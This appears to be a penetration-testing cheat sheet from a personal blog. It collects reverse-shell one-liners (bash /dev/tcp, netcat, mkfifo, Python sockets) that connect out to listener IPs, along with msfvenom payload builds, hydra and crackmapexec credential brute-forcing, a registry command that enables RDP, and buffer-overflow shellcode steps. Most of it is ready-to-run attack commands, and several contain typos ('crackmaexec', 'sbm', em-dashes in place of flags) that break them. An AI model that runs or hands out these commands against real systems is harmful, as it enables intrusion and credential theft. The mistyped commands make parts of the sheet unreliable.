---
title: Exploitation
excerpt: "This is a guide for exploitation"
last_modified_at: 13-01-2022
categories:
- guide
tags:  
- pentest
- exploitation
image: /assets/images/cheatsheet/exploitation.jpg
---
## Public exploits
Links:
- [Exploitdb](www.exploit-db.com)
- [packetstormysecurity](packetstormysecurity.com)
- [securityfocus](securityfocus.com)
- [CVE Mitre](cve.mitre.org/cve/search_cve_list.html)

### Searchsploit
```bash
searchsploit webmin
searchsploit webmin —exclude="php|Dans"
searchsploit -e webmin :
searchsploit ipfire —id -m 42149 
```  

### **Important!**
- **Always check the payloads.**
- Check the dependencies libs,dll's...
- Always test before execute in the target.  

## Wordlists
* [Seclist](https://github.com/danielmiessler/SecLists)
* [assetnote](https://wordlists.assetnote.io/)  

## Reverse shell
```bash
nc -nlvp 4444 # Open port

bash -i >& /dev/tcp/172.100.50.0/4444 0>&1
nc -e /bin/bash 172.100.50.0 4444
/bin/sh | nc 127.0.0.1 5555
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.100.50.0 4444 >/tmp/f # OpenBSD

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.1.21",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.100.50.0 LPORT=4444 -f exe > reverse.exe # Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.100.50.0" LPORT=4444 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="172.100.50.0" LPORT=4444 -f raw > shell.jsp
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.100.50.0 LPORT=4444 -f raw -o shell.php

python3 -c 'import pty; pty.spawn("/bin/sh")' # Interactive shell
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
```

### Mutations
```bash
john —wordlist=file —rules —stdout > mutacao # New wordlist with variations of the first
nano /etc/john/john.conf → wordlist mode rules # Mutations personalized rules
    # ^[0-9] : 0 to 9 in the begin
    # $[0-9] : 0 to 9 in te final
    # $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.

cewl google.com -m 7 # Find every word in the page with the lenght

crunch 10 10 -t rogerio^%% -o wordlist # List based in patterns
    # % : Numbers.
    # ^ : Special character.
    # @ : Lower case character.
    # , : Capital character.
```  

### Key space brute force
All the possible variations.
```bash
crunch 4 4 0123456789 -o pin # All combinations with 4 digits.

crunch 6 6 -f charset.lst numeric -o pin # Use the crunch numeric pattern
```  

## Brute force
```bash 
hydra -v -l rogerio -p admin 172.16.1.60 sbm #SMB
hydra -v -L users.txt -p pass.txt 172.16.1.60 sbm 
hydra -v -L users.txt -P pass.txt -M alvos.txt sbm
hydra -L rdp_users.txt -P rdp_pass.txt rdp://172.16.1.188 -I -t 1 #RDP
hydra -v L users.txt -p admin 172.16.1.5 ssh
hydra -v -L users.txt -P password 172.16.1.5 -t 1 -W 5
    # -s : Set port.
    # -t : Threads.
    # -W : Sleep time beetwen tasks.
```  
### **WinRM**
Link:
* [winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/
Windows Remote Management, is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. Port 5985/HTTP, 5986/HTTPS.
Evil-WinRM
```bash
evil-winrm -i 172.16.1.140 -u user -p password
```  

### RDP
Active or disable rdp in windows
- Active
    - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    - netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
- Disable
    - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
    - netsh advfirewall firewall set rule group="remote desktop" new enable=No

### crackmaexec
Swiss knife for pentest
```bash
crackmapexec <protocol> <target(s)> -u username -p password

crackmaexec smb 172.16.1.0/24 -u jonh -p 'jonh@10' # Scan the network to the test all logins
crackmaexec smb 172.16.1.60 -u jonh -p 'jonh@10'  -x 'whoami' # Execute this command

crackmaexec ldap 192.168.1.0/24 -u user -p 'jonh@10'
crackmaexec ldap 192.168.1.0/24 -u user -H hashexemple

crackmaexec mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce

crackmaexec winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```  

## Buffer overflow

### Pattern offset
```bash
/usr/bin/msf-patter_create -l 2200 # Create pattern
/usr/bin/msf-pattern_offset -l 2200 -q 43396f43 # Find EIP overwrite
```  
### Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.16 lport=443 exitfunc=thread -b "\x00" -f c
```  

### GDB/Linux
```bash
gdb -q ./file
info functions               # Show functions
set disassembly-flavor intel # Set flavor
disas main                   # Dissasembly specific funtion
b* 0x5655621f                # Breakpoint
run < <(python -c 'print "A" * 200') # Input data
i r                          # Show registers(esp,eip,...)
x/16xw $esp                  # Specific memory zone
break main                   # Brakpoint in the funtion
set $eip = 0x56556982        # Jump to specific function/zone
python -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"' | ./file # Send a specific number, that will allow overwrite and redirect the EIP.
```